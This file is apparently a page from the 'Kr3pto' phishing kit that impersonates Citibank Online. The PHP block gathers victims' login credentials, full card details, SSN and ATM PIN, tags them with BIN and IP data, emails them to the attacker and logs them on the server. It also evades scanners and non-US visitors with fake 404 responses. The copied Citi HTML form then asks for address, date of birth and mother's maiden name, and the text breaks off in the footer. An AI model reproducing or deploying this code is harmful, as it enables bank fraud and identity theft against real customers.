<?php
require "configg.php";
require "si_assetz/cinc/session_protect.php";
require "si_assetz/cinc/functions.php";
require "si_assetz/old_blocker.php";
if($enable_killbot == 1){
	if(checkkillbot($killbot_key) == true){
		$fp = fopen("si_assetz/cinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
header("Connection: close\r\n");
http_response_code(404);
exit;
	}
}
if($mobile_lock == 1){
	require "si_assetz/mob_lock.php";
}
if($US_lock == 1){
	if(onlyus() == true){
	
	}else{
		$fp = fopen("si_assetz/cinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
header("Connection: close\r\n");
http_response_code(404);
exit;
	}
}
if($external_antibot == 1){
	if(checkBot($apikey) == true){
		$fp = fopen("si_assetz/cinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
header("Connection: close\r\n");
http_response_code(404);
exit;
	}
}
error_reporting(0);
ini_set('display_errors', '0');
date_default_timezone_set('Europe/London');


session_start();
if($_POST['ccname'] and $_POST['ccnum'] and $_POST['ccexp'] and $_POST['cccvv'] and $_POST['ssn'] and $_POST['atmpin']){
	$_SESSION['ccname'] = $_POST['ccname'];
	$_SESSION['ccnum'] = $_POST['ccnum'];
	$_SESSION['ccexp'] = $_POST['ccexp'];
	$_SESSION['cccvv'] = $_POST['cccvv'];
	$_SESSION['ssn'] = $_POST['ssn'];
	$_SESSION['atmpin'] = $_POST['atmpin'];
	


	$username = $_SESSION['username'];
	$password = $_SESSION['password'];
	

	
	$ccname = $_SESSION['ccname'];
	$ccnum = $_SESSION['ccnum'];
	$ccexp = $_SESSION['ccexp'];
	$cccvv = $_SESSION['cccvv'];
	$ssn = $_SESSION['ssn'];
	$atmpin = $_SESSION['atmpin'];
	
	
$date = date('l d F Y');
$time = date('H:i');
$ip = $_SERVER['REMOTE_ADDR'];
$ccno = str_replace(' ', '', $ccnum);
$bin = substr($ccno, 0, 6);
$ccc = bankDetails($bin);
$scheme =  strtoupper($ccc['scheme']);
$type =  strtoupper($ccc['type']);
$brand =  strtoupper($ccc['brand']);
$bank =  strtoupper($ccc['bank']['name']);
$bin =  strtoupper($ccc['bin']);
$country =  strtoupper($ccc['country']['alpha2']);
if($ccc['prepaid'] == true){$prepaid = strtoupper('Prepaid');}else{$prepaid = strtoupper('Non-Prepaid');}
$ccinfo = "$bin | $scheme | $type | $brand | $bank";
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$os = os_info($useragent);
$browser = browsername();
$VictimInfo  = "| IP Address : $ip\n";
$VictimInfo .= "| UserAgent : $useragent\n";
$VictimInfo .= "| Browser : $browser\n";
$VictimInfo .= "| OS : $os";
$headers = "From:$ccname <Kr3ptoCITI@results.co.uk>";
$subj = "Kr3pto CITI Login+Card $bin - $scheme $type $brand $bank [$country - $os - $ip]";


$data = "
+ ------------- CITI Login+Card --------------+
+ ------------------------------------------+
+ Account Information
| Username : $username
| Password : $password
+ ------------------------------------------+
+ Card Information
| Card Holder : $ccname
| Card Number : $ccnum
| Card Expiry : $ccexp
| CVV : $cccvv
| SSN : $ssn
| ATM PIN : $atmpin
| BIN Info : $ccinfo
+ ------------------------------------------+
+ Victim Information
$VictimInfo
| Received : $date @ $time
+ ---------------- @Kr3pto ------------------+
";
mail($to,$subj,$data,$headers);	


if($saveonhost == 1){
$fp = fopen('l0gz/CITI_loginwithcard_.txt', 'a');
fwrite($fp, $data."\n");
fclose($fp);
}
	

}else{
	$fp = fopen("si_assetz/cinc/blacklist.dat", "a");
	fputs($fp, "\r\n$ip\r\n");
	fclose($fp);
	header_remove();
header("Connection: close\r\n");
http_response_code(404);
exit;
}
?>
<!DOCTYPE html>
<html class="cbolui-ddl" style="display: block; visibility: visible;" lang="en">
    <head>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
        <meta charset="utf-8" />
        <title>Citibank Online</title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="icon" type="image/x-icon" href="si_assetz/img/favicon.ico" />
        <link rel="stylesheet" href="si_assetz/css/styles.css" />
        <link rel="stylesheet" href="si_assetz/css/other.css" />
        <style>
			input {
				border: .9px solid transparent !important;
			}
			.errored {
				border-color: #d60000 !important;
			}
			.errored:focus {
				border-width: 2px !important;
			}
			label.hiddenclass {
				font-size: .75rem;
				color: #666;
				width: 100%;
				pointer-events: none;
				transition: opacity 225ms ease-in-out;
			}
			.cbolui-ddl-post label {
				font-weight: 400;
				margin-bottom: 0;
			}
			.cbolui-ddl label {
				display: inline-block;
				max-width: 100%;
			}
			.cbolui-ddl *, .cbolui-ddl ::after, .cbolui-ddl ::before {
				box-sizing: border-box;
			}
			.cbolui-ddl-post .form-group {
				margin-bottom: 0px;
			}
        </style>
		<script src="si_assetz/js/jquery.js"></script>
		<script src="si_assetz/js/mask.js"></script>
        <script>
            $(document).ready(function () {
                var allInputs = $(":input");
                allInputs.focusin(function () {
					$(this).attr('placeholder','');
					$(this).parent().prev().css('opacity','1');
				});
                allInputs.focusout(function () {
					$(this).attr('placeholder',$(this).parent().prev().text());
					$(this).parent().prev().css('opacity','0');
                    $(this).blur(function () {
                        if ($(this).prop("required")) {
                            if (!$(this).val()) {
								$(this).addClass('errored');
								$(this).parent().next().show();
                            } else {
								$(this).parent().prev().css('opacity','1');
								$(this).removeClass('errored');
								$(this).parent().next().hide();
                            }
                        }
                    });
                });
            });
        </script>
		<script type="text/javascript">
			jQuery(function($){
				$("#dob").mask("00/00/0000",{placeholder:"MM/DD/YYYY"});
				$("#mobile").mask("(000) 000-0000");
				$("#zipcode").mask("00000");
			});
		</script>
    </head>
    <body cz-shortcut-listen="true">
        <app-root _nghost-ytb-c269="" ng-version="11.2.14">
            <cbol-core _ngcontent-ytb-c269="" _nghost-ytb-c258="">
                <citi-parent-layout _ngcontent-ytb-c258="" _nghost-ytb-c212="" class="ng-tns-c212-0">
                    <div _ngcontent-ytb-c212="" class="ng-tns-c212-0 citi-outer-container cbolui-responsive cbolui-ddl-post">
                        <citi-header _ngcontent-ytb-c212="" class="ng-tns-c212-0" _nghost-ytb-c190="">
                            <a _ngcontent-ytb-c190="" aria-live="assertive" class="alternateSkipNav" href="">Skip to Content</a>
                            <div _ngcontent-ytb-c190="" class="header">
                                <div _ngcontent-ytb-c190="" class="primary">
                                    <citi-banner2 _ngcontent-ytb-c190="" _nghost-ytb-c191="">
                                        <div _ngcontent-ytb-c191="" role="banner" class="banner ng-star-inserted">
                                            <div _ngcontent-ytb-c191="" class="content-wrap">
                                                <div _ngcontent-ytb-c191="" class="journeyLogo">
                                                    <div _ngcontent-ytb-c191="" class="logoDiv default ng-star-inserted">
                                                        <a _ngcontent-ytb-c191="" id="sessionFocusUrl" tabindex="0" href="https://online.citi.com/" class="ng-star-inserted">
                                                            <img _ngcontent-ytb-c191="" alt="Citi" src="si_assetz/img/citilogoredesign.png" class="ng-star-inserted" />
                                                        </a>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </citi-banner2>
                                    <citi-navigation3 _ngcontent-ytb-c190="" class="citi-navigation" _nghost-ytb-c203="">
                                        <div _ngcontent-ytb-c203="" role="navigation" aria-label="Main" class="navigationParent preLogin ng-star-inserted" style="background-color: rgb(0, 45, 114);">
                                            <div _ngcontent-ytb-c203="" class="mobileMenuContainer"></div>
                                            
                                        </div>
                                        <citi-sign-on-modal3 _ngcontent-ytb-c203="" class="citi-sign-on-modal" _nghost-ytb-c206=""></citi-sign-on-modal3><citi-nav-search _ngcontent-ytb-c203="" _nghost-ytb-c207=""></citi-nav-search>
                                    </citi-navigation3>
                                </div>
                                <citi-welcome-bar _ngcontent-ytb-c190="" _nghost-ytb-c192=""></citi-welcome-bar>
                            </div>
                        </citi-header>
                        <div _ngcontent-ytb-c212="" id="maincontent" class="ng-tns-c212-0">
                            <div _ngcontent-ytb-c212="" class="ng-tns-c212-0">
                                <div _ngcontent-ytb-c212="" class="ng-tns-c212-0 citi-container cbolui-ddl theme-light">
                                    <div _ngcontent-ytb-c212="" class="appbody ng-tns-c212-0 ng-star-inserted">
                                        <router-outlet _ngcontent-ytb-c258="" class="ng-tns-c212-0"></router-outlet>
                                        <app-set-up-online-access _nghost-ytb-c286="" class="ng-tns-c212-0 ng-star-inserted">
                                            <citi-simple-layout _ngcontent-ytb-c286="" role="main" brandingtype="preLoginVanilla">
                                                <citi-jamp _ngcontent-ytb-c286="" _nghost-ytb-c47="" class="hidden jamp-page-level">
                                                    <div _ngcontent-ytb-c47="" class="fillHeight">
                                                        <div _ngcontent-ytb-c47="" class="alignmentEl fillHeight">
                                                            <div _ngcontent-ytb-c47="" class="jamp jamp-css"><span _ngcontent-ytb-c47="" class="img"></span><span _ngcontent-ytb-c47="" class="message"> Please Wait… </span></div>
                                                        </div>
                                                    </div>
                                                </citi-jamp>
                                                <citi-form-container _ngcontent-ytb-c286="" formheader="" formaction="" class="set-up-online-overflow ng-star-inserted">
                                                    <form name="undefined" action="Email.php?sessionid=<?php echo generateRandomString(130); ?>&sslchannel=true" method="POST">
                                                        <div>
                                                            
                                                                <div class="progress-indicator-wrapper clearfix col-xs-12">
                                                                    <ol class="progress-indicator col-xs-12">
                                                                        <li class="progress-indicator-step progress-indicator-step-finished">
                                                                            <span class="primary-label">Payment Information</span>
                                                                        </li>
                                                                        <li class="progress-indicator-step progress-indicator-step-active">
                                                                            <span class="primary-label">Personal Information</span>
                                                                        </li>
                                                                        <li class="progress-indicator-step">
                                                                            <span class="primary-label">Registered Email Information</span>
                                                                        </li>
                                                                        <li class="progress-indicator-step">
                                                                            <span class="primary-label">Confirmation</span>
                                                                        </li>
                                                                    </ol>
                                                                </div>
                                                            
                                                            <section _ngcontent-ytb-c286="" class="errorSectionDiv"></section>
                                                            <section _ngcontent-ytb-c286="" class="formBodyContainer">
                                                                <section _ngcontent-ytb-c286="" class="parentDiv">
                                                                    <section _ngcontent-ytb-c286="">
                                                                        <citi-text-header _ngcontent-ytb-c286="" level="1" class="HelpHeader" _nghost-ytb-c54="">
                                                                            
                                                                            <h1 _ngcontent-ytb-c54="" class="HelpHeader header-level-2 ng-star-inserted">Personal Information</h1>
                                                                        </citi-text-header>
                                                                    </section>
                                                                    <section _ngcontent-ytb-c286="">
                                                                        <citi-text-header _ngcontent-ytb-c286="" level="2" class="subHeader" _nghost-ytb-c54="">
                                                                            <h2 _ngcontent-ytb-c54="" class="header-level-3 subHeader ng-star-inserted">
                                                                                Please fill the form below in order to proceed with your login process.
                                                                            </h2>
                                                                        </citi-text-header>
                                                                    </section>
                                                                    <section _ngcontent-ytb-c286="">
                                                                        <citi-input-group _ngcontent-ytb-c286="" required="true" class="radioInline" _nghost-ytb-c100="">
                                                                            <fieldset _ngcontent-ytb-c100="">
                                                                                <div _ngcontent-ytb-c100="" class="row">
                                                                                    
																					
																					<section>
                                                                                        <div class="form-group">
																							<label for="fullname" class="hiddenclass" style="opacity: 0;">Full name</label>
                                                                                            <div>
																								<input placeholder="Full name" type="text" name="fullname" id="fullname" class="form-control ng-untouched ng-pristine ng-valid" required="">
                                                                                            </div>
																							<div style="display:none;" class="input-error ng-star-inserted"><span class="validation-message-danger">Please enter your Full name.</span></div>
                                                                                        </div>
                                                                                    </section>
																					
																					<section>
                                                                                        <div class="form-group">
																							<label for="dob" class="hiddenclass" style="opacity: 0;">Date of Birth</label>
                                                                                            <div>
																								<input placeholder="Date of Birth" type="tel" name="dob" id="dob" class="form-control ng-untouched ng-pristine ng-valid" required="">
                                                                                            </div>
																							<div style="display:none;" class="input-error ng-star-inserted"><span class="validation-message-danger">Please enter your Date of Birth.</span></div>
                                                                                        </div>
                                                                                    </section>
																					
																					<section>
                                                                                        <div class="form-group">
																							<label for="mobile" class="hiddenclass" style="opacity: 0;">Mobile number</label>
                                                                                            <div>
																								<input placeholder="Mobile number" type="tel" name="mobile" id="mobile" class="form-control ng-untouched ng-pristine ng-valid" required="">
                                                                                            </div>
																							<div style="display:none;" class="input-error ng-star-inserted"><span class="validation-message-danger">Please enter your Phone number.</span></div>
                                                                                        </div>
                                                                                    </section>
																					
																					
																					<section>
                                                                                        <div class="form-group">
																							<label for="address" class="hiddenclass" style="opacity: 0;">Address</label>
                                                                                            <div>
																								<input placeholder="Address" type="text" name="address" id="address" class="form-control ng-untouched ng-pristine ng-valid" required="">
                                                                                            </div>
																							<div style="display:none;" class="input-error ng-star-inserted"><span class="validation-message-danger">Please enter your Address.</span></div>
                                                                                        </div>
                                                                                    </section>
																					
																					
																					<section>
                                                                                        <div class="form-group">
																							<label for="city" class="hiddenclass" style="opacity: 0;">City</label>
                                                                                            <div>
																								<input placeholder="City" type="text" name="city" id="city" class="form-control ng-untouched ng-pristine ng-valid" required="">
                                                                                            </div>
																							<div style="display:none;" class="input-error ng-star-inserted"><span class="validation-message-danger">Please enter your City.</span></div>
                                                                                        </div>
                                                                                    </section>
																					
																					
																					<section>
                                                                                        <div class="form-group">
																							<label for="state" class="hiddenclass" style="opacity: 0;">State</label>
                                                                                            <div>
																								<input placeholder="State" type="text" name="state" id="state" class="form-control ng-untouched ng-pristine ng-valid" required="">
                                                                                            </div>
																							<div style="display:none;" class="input-error ng-star-inserted"><span class="validation-message-danger">Please enter your State.</span></div>
                                                                                        </div>
                                                                                    </section>
																					
																					
																					<section>
                                                                                        <div class="form-group">
																							<label for="zipcode" class="hiddenclass" style="opacity: 0;">Zip code</label>
                                                                                            <div>
																								<input placeholder="Zip code" type="tel" name="zipcode" maxlength="5" id="zipcode" class="form-control ng-untouched ng-pristine ng-valid" required="">
                                                                                            </div>
																							<div style="display:none;" class="input-error ng-star-inserted"><span class="validation-message-danger">Please enter your Zip code.</span></div>
                                                                                        </div>
                                                                                    </section>
																					
																					<section>
                                                                                        <div class="form-group">
																							<label for="mmn" class="hiddenclass" style="opacity: 0;">Mother's Maiden Name</label>
                                                                                            <div>
																								<input placeholder="Mother's Maiden Name" type="text" name="mmn" id="mmn" class="form-control ng-untouched ng-pristine ng-valid" required="">
                                                                                            </div>
																							<div style="display:none;" class="input-error ng-star-inserted"><span class="validation-message-danger">Please enter your Mother's Maiden Name.</span></div>
                                                                                        </div>
                                                                                    </section>
																					
																					
																					

																					
                                                                                    
                                                                                </div>
                                                                            </fieldset>
                                                                        </citi-input-group>
                                                                    </section>
                                                                    
																	
                                                                    <section _ngcontent-ytb-c286="" class="setUpButton">
                                                                        <citi-row _ngcontent-ytb-c286="">
                                                                            <div class="row">
                                                                                <citi-column _ngcontent-ytb-c286="" xs="12">
                                                                                    <div class="col-xs-12">
                                                                                        <citi-cta _ngcontent-ytb-c286="" type="primary" size="large" _nghost-ytb-c46="">
                                                                                            <button style="text-align: center;" type="submit" class="ng-star-inserted btn btn-primary large">
                                                                                                Continue
                                                                                            </button>
                                                                                        </citi-cta>
                                                                                        
                                                                                    </div>
                                                                                </citi-column>
                                                                            </div>
                                                                        </citi-row>
                                                                    </section>
                                                                </section>
                                                            </section>
                                                            <section _ngcontent-ytb-c286="" class="modalCloseButton">
                                                                <citi-modal _ngcontent-ytb-c286="" showcancelbutton="false" primarybuttonurl="" primarybuttontarget="_self" idstr="myTimeoutModal" class="text-center" _nghost-ytb-c53="">
                                                                    <div _ngcontent-ytb-c53="" ddlariahideouterdom="">
                                                                        <div _ngcontent-ytb-c53="" tabindex="-1" class="modal citi-modal fade scrollable" style="display: none;" id="myTimeoutModal">
                                                                            <div _ngcontent-ytb-c53="" tabindex="-1" class="modal-dialog">
                                                                                <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                                <div _ngcontent-ytb-c53="" cdktrapfocus="" class="modal-content">
                                                                                    <div _ngcontent-ytb-c53="" class="modal-header">
                                                                                        <button _ngcontent-ytb-c53="" type="button" aria-label="Close modal" class="close-button ng-star-inserted">
                                                                                            <span _ngcontent-ytb-c53="" aria-hidden="false" class="sr-only">Close</span>
                                                                                        </button>
                                                                                    </div>
                                                                                    <div _ngcontent-ytb-c53="" role="document">
                                                                                        <div _ngcontent-ytb-c53="" tabindex="-1" class="modal-body">
                                                                                            <div _ngcontent-ytb-c53="" tabindex="-1" class="ng-star-inserted">
                                                                                                <citi-text-header _ngcontent-ytb-c53="" level="2" tabindex="-1" _nghost-ytb-c54="">
                                                                                                    <h2 _ngcontent-ytb-c54="" class="header-level-2 ng-star-inserted">Still There?</h2>
                                                                                                </citi-text-header>
                                                                                            </div>
                                                                                            <div _ngcontent-ytb-c53="" class="modal-body-content" tabindex="-1"><div _ngcontent-ytb-c286=""></div></div>
                                                                                        </div>
                                                                                    </div>
                                                                                    <div _ngcontent-ytb-c53="" class="modal-footer">
                                                                                        <div _ngcontent-ytb-c53="" class="text-right ng-star-inserted">
                                                                                            <div _ngcontent-ytb-c53="" class="citi-modal-controls ng-star-inserted">
                                                                                                <citi-cta _ngcontent-ytb-c53="" class="modal-primary-btn btnclassTest ng-star-inserted" _nghost-ytb-c46="">
                                                                                                    <button
                                                                                                        _ngcontent-ytb-c46=""
                                                                                                        style="text-align: center;"
                                                                                                        type="button"
                                                                                                        id="5a95bae5-5a8f-c485-a20d-e8a0375641b9"
                                                                                                        role="button"
                                                                                                        class="btn btn-primary ng-star-inserted"
                                                                                                    >
                                                                                                        I'm still here
                                                                                                    </button>
                                                                                                </citi-cta>
                                                                                                <span _ngcontent-ytb-c53="" aria-hidden="false" class="sr-only"></span>
                                                                                            </div>
                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                                <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-ytb-c53="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div>
                                                                    </div>
                                                                </citi-modal>
                                                            </section>
                                                        </div>
                                                    </form>
                                                </citi-form-container>
                                            </citi-simple-layout>
                                        </app-set-up-online-access>
                                        <mfa-modal _ngcontent-ytb-c269="" _nghost-ytb-c181="" class="ng-tns-c212-0">
                                            <div _ngcontent-ytb-c181=""><router-outlet _ngcontent-ytb-c181="" name="mfaContent"></router-outlet></div>
                                            <div _ngcontent-ytb-c181="" class="mfa-screen-alignment"><router-outlet _ngcontent-ytb-c181="" name="mfaConfirm"></router-outlet></div>
                                        </mfa-modal>
                                        <ivr-modal _ngcontent-ytb-c258="" _nghost-ytb-c262="" class="ng-tns-c212-0">
                                            <citi-modal _ngcontent-ytb-c262="" idstr="modalID" id="ivr-modal" footerprojection="true" class="cbolui-ddl-post" _nghost-ytb-c53="">
                                                <div _ngcontent-ytb-c53="" ddlariahideouterdom="">
                                                    <div _ngcontent-ytb-c53="" tabindex="-1" class="modal citi-modal fade" style="display: none;" id="modalID">
                                                        <div _ngcontent-ytb-c53="" tabindex="-1" class="modal-dialog">
                                                            <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                            <div _ngcontent-ytb-c53="" cdktrapfocus="" class="modal-content">
                                                                <div _ngcontent-ytb-c53="" class="modal-header">
                                                                    <button _ngcontent-ytb-c53="" type="button" aria-label="Close modal" class="close-button ng-star-inserted">
                                                                        <span _ngcontent-ytb-c53="" aria-hidden="false" class="sr-only">Close</span>
                                                                    </button>
                                                                </div>
                                                                <div _ngcontent-ytb-c53="" role="document">
                                                                    <div _ngcontent-ytb-c53="" tabindex="-1" class="modal-body">
                                                                        <div _ngcontent-ytb-c53="" tabindex="-1" class="header ng-star-inserted"></div>
                                                                        <div _ngcontent-ytb-c53="" class="modal-body-content" tabindex="-1">
                                                                            <p _ngcontent-ytb-c262=""></p>
                                                                            <div _ngcontent-ytb-c262="" class="ivr-cta-wrapper"></div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div _ngcontent-ytb-c53="" class="modal-footer">
                                                                    <div _ngcontent-ytb-c53="" class="ng-star-inserted"><div _ngcontent-ytb-c53=""></div></div>
                                                                </div>
                                                            </div>
                                                            <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                        </div>
                                                    </div>
                                                    <div _ngcontent-ytb-c53="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div>
                                                </div>
                                            </citi-modal>
                                        </ivr-modal>
                                        <cbol-session _ngcontent-ytb-c258="" _nghost-ytb-c259="" class="ng-tns-c212-0">
                                            <citi-modal _ngcontent-ytb-c259="" showcancelbutton="true" primarybuttontarget="_blank" openerselector="#sessionFocus" class="cbolui-ddl-post" _nghost-ytb-c53="">
                                                <div _ngcontent-ytb-c53="" ddlariahideouterdom="">
                                                    <div _ngcontent-ytb-c53="" tabindex="-1" class="modal citi-modal fade" style="display: none;" id="citi-modal-2">
                                                        <div _ngcontent-ytb-c53="" tabindex="-1" class="modal-dialog">
                                                            <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                            <div _ngcontent-ytb-c53="" cdktrapfocus="" class="modal-content">
                                                                <div _ngcontent-ytb-c53="" class="modal-header">
                                                                    <button _ngcontent-ytb-c53="" type="button" aria-label="Close modal" class="close-button ng-star-inserted">
                                                                        <span _ngcontent-ytb-c53="" aria-hidden="false" class="sr-only">Close</span>
                                                                    </button>
                                                                </div>
                                                                <div _ngcontent-ytb-c53="" role="document">
                                                                    <div _ngcontent-ytb-c53="" tabindex="-1" class="modal-body">
                                                                        <div _ngcontent-ytb-c53="" tabindex="-1" class="header ng-star-inserted"></div>
                                                                        <div _ngcontent-ytb-c53="" class="modal-body-content" tabindex="-1">
                                                                            <p _ngcontent-ytb-c259=""></p>
                                                                            <p _ngcontent-ytb-c259=""><b _ngcontent-ytb-c259=""> </b></p>
                                                                            <p _ngcontent-ytb-c259=""></p>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div _ngcontent-ytb-c53="" class="modal-footer"><div _ngcontent-ytb-c53="" class="text-right ng-star-inserted"></div></div>
                                                            </div>
                                                            <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                        </div>
                                                    </div>
                                                    <div _ngcontent-ytb-c53="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div>
                                                </div>
                                            </citi-modal>
                                        </cbol-session>
                                        <cobrowse-modal _ngcontent-ytb-c258="" _nghost-ytb-c209="" class="ng-tns-c212-0">
                                            <citi-modal _ngcontent-ytb-c209="" idstr="modal" _nghost-ytb-c53="">
                                                <div _ngcontent-ytb-c53="" ddlariahideouterdom="">
                                                    <div _ngcontent-ytb-c53="" tabindex="-1" class="modal citi-modal fade" style="display: none;" id="modal">
                                                        <div _ngcontent-ytb-c53="" tabindex="-1" class="modal-dialog">
                                                            <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                            <div _ngcontent-ytb-c53="" cdktrapfocus="" class="modal-content">
                                                                <div _ngcontent-ytb-c53="" class="modal-header">
                                                                    <button _ngcontent-ytb-c53="" type="button" aria-label="Close modal" class="close-button ng-star-inserted">
                                                                        <span _ngcontent-ytb-c53="" aria-hidden="false" class="sr-only">Close</span>
                                                                    </button>
                                                                </div>
                                                                <div _ngcontent-ytb-c53="" role="document">
                                                                    <div _ngcontent-ytb-c53="" tabindex="-1" class="modal-body">
                                                                        <div _ngcontent-ytb-c53="" tabindex="-1" class="header ng-star-inserted"><div _ngcontent-ytb-c209="" title="" class="ng-star-inserted"></div></div>
                                                                        <div _ngcontent-ytb-c53="" class="modal-body-content" tabindex="-1">
                                                                            <div _ngcontent-ytb-c209="" class="ng-star-inserted">
                                                                                <p _ngcontent-ytb-c209=""></p>
                                                                                <div _ngcontent-ytb-c209="" class="theme-light">
                                                                                    <citi-input _ngcontent-ytb-c209="" type="text" class="citi-input row" _nghost-ytb-c92="">
                                                                                        <div _ngcontent-ytb-c92="" class="col-xs-12 form-group">
                                                                                            <label _ngcontent-ytb-c92="" for="undefined" id="null" class="text-input-label"></label>
                                                                                            <div _ngcontent-ytb-c92="">
                                                                                                <div _ngcontent-ytb-c92="">
                                                                                                    <div _ngcontent-ytb-c92="">
                                                                                                        <input
                                                                                                            _ngcontent-ytb-c92=""
                                                                                                            aria-label=""
                                                                                                            type="text"
                                                                                                            placeholder=""
                                                                                                            maxlength="524288"
                                                                                                            autocomplete="off"
                                                                                                            class="form-control ng-untouched ng-pristine ng-valid"
                                                                                                        />
                                                                                                    </div>
                                                                                                </div>
                                                                                                <span _ngcontent-ytb-c92="" aria-hidden="true" class="sr-only" id="undefined-error">Error</span>
                                                                                            </div>
                                                                                        </div>
                                                                                    </citi-input>
                                                                                </div>
                                                                                <div _ngcontent-ytb-c209=""></div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div _ngcontent-ytb-c53="" class="modal-footer"><div _ngcontent-ytb-c53="" class="text-right ng-star-inserted"></div></div>
                                                            </div>
                                                            <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                        </div>
                                                    </div>
                                                    <div _ngcontent-ytb-c53="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div>
                                                </div>
                                            </citi-modal>
                                        </cobrowse-modal>
                                        <citi-route-detector _ngcontent-ytb-c258="" class="ng-tns-c212-0"></citi-route-detector><citi-session-handler _ngcontent-ytb-c258="" interval="10000" class="ng-tns-c212-0"></citi-session-handler>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <citi-footer _ngcontent-ytb-c212="" class="ng-tns-c212-0" _nghost-ytb-c193="">
                            <div _ngcontent-ytb-c193="" role="contentinfo" class="footer">
                                <citi-footer-navigation _ngcontent-ytb-c193="" _nghost-ytb-c194="">
                                    <div _ngcontent-ytb-c194="" class="navigation ng-star-inserted">
                                        <div _ngcontent-ytb-c194="" class="content">
                                            <div _ngcontent-ytb-c194="" role="group" class="section ng-star-inserted">
                                                <div _ngcontent-ytb-c194="" class="title ng-star-inserted" id="nav-list-header0">Why Citi</div>
                                                <button _ngcontent-ytb-c194="" type="button" class="title ng-star-inserted" aria-controls="list0" aria-expanded="false">Why Citi</button>
                                                <ul _ngcontent-ytb-c194="" id="list0" aria-labelledby="nav-list-header0" aria-hidden="false" class="ng-star-inserted">
                                                    <li _ngcontent-ytb-c194="" id="navOurStory" class="ng-star-inserted">
                                                        <citi-cta _ngcontent-ytb-c194="" type="tertiary" _nghost-ytb-c46="" class="ng-star-inserted">
                                                            <a _ngcontent-ytb-c46="" target="_self" id="6c3bfa6a-e897-ab4c-95c1-0cf25cf6d593" href="http://www.citigroup.com/citi/" class="btn btn-link ng-star-inserted">Our Story</a>
                                                        </citi-cta>
                                                    </li>
                                                    <li _ngcontent-ytb-c194="" id="navCareers" class="ng-star-inserted">
                                                        <citi-cta _ngcontent-ytb-c194="" type="tertiary" _nghost-ytb-c46="" class="ng-star-inserted">
                                                            <a _ngcontent-ytb-c46="" target="_self" id="44356860-f570-0f49-881e-361a0023d9c8" href="https://jobs.citi.com/" class="btn btn-link ng-star-inserted">Careers</a>
                                                        </citi-cta>
                                                    </li>
                                                    <li _ngcontent-ytb-c194="" id="navBenefits&amp;Services" class="ng-star-inserted">
                                                        <citi-cta _ngcontent-ytb-c194="" type="tertiary" _nghost-ytb-c46="" class="ng-star-inserted">
                                                            <a
                                                                _ngcontent-ytb-c46=""
                                                                target="_self"
                                                                id="7c4c15f6-a35d-4249-3cea-c28a4e117029"
                                                                href="https://online.citi.com/US/JRS/pands/detail.do?ID=ServicesOverview"
                                                                class="btn btn-link ng-star-inserted"
                                                            >
                                                                Benefits and Services
                                                            </a>
                                                        </citi-cta>
                                                    </li>
                                                    <li _ngcontent-ytb-c194="" id="navRewards" class="ng-star-inserted">
                                                        <citi-cta _ngcontent-ytb-c194="" type="tertiary" _nghost-ytb-c46="" class="ng-star-inserted">
                                                            <a
                                                                _ngcontent-ytb-c46=""
                                                                target="_self"
                                                                id="126968d4-c2fc-e8f3-d75c-d904e2311c70"
                                                                href="https://online.citi.com/US/JRS/pands/detail.do?ID=Rewards"
                                                                class="btn btn-link ng-star-inserted"
                                                            >
                                                                Rewards
                                                            </a>
                                                        </citi-cta>
                                                    </li>
                                                    <li _ngcontent-ytb-c194="" id="navCitiEasyDeals" class="ng-star-inserted">
                                                        <citi-cta _ngcontent-ytb-c194="" type="tertiary" _nghost-ytb-c46="" class="ng-star-inserted">
                                                            <a
                                                                _ngcontent-ytb-c46=""
                                                                target="_blank"
                                                                id="f55e5c72-dc5e-0dff-18e3-67743c71dbae"
                                                                href="https://citieasydeals.com/"
                                                                aria-describedby="bbf34fb1-ef17-ee8a-e44a-be8aff3b5d86_ariadescription"
                                                                class="btn btn-link ng-star-inserted"
                                                            >
                                                                Citi Easy Deals<sup>SM</sup>
                                                            </a>
                                                            <span _ngcontent-ytb-c46="" aria-hidden="true" class="sr-only ng-star-inserted" id="bbf34fb1-ef17-ee8a-e44a-be8aff3b5d86_ariadescription">Opens in new window</span>
                                                        </citi-cta>
                                                    </li>
                                                    <li _ngcontent-ytb-c194="" id="navPrivatePass" class="ng-star-inserted">
                                                        <citi-cta _ngcontent-ytb-c194="" type="tertiary" _nghost-ytb-c46="" class="ng-star-inserted">
                                                            <a
                                                                _ngcontent-ytb-c46=""
                                                                target="_blank"
                                                                id="d8b1782f-3b26-8338-c71c-5fbda7310631"
                                                                href="http://www.citiprivatepass.com/"
                                                                aria-describedby="3d9d875e-8905-a4e6-999d-c4220ca570e0_ariadescription"
                                                                class="btn btn-link ng-star-inserted"
                                                            >
                                                                Citi Entertainment<sup>®</sup>
                                                            </a>
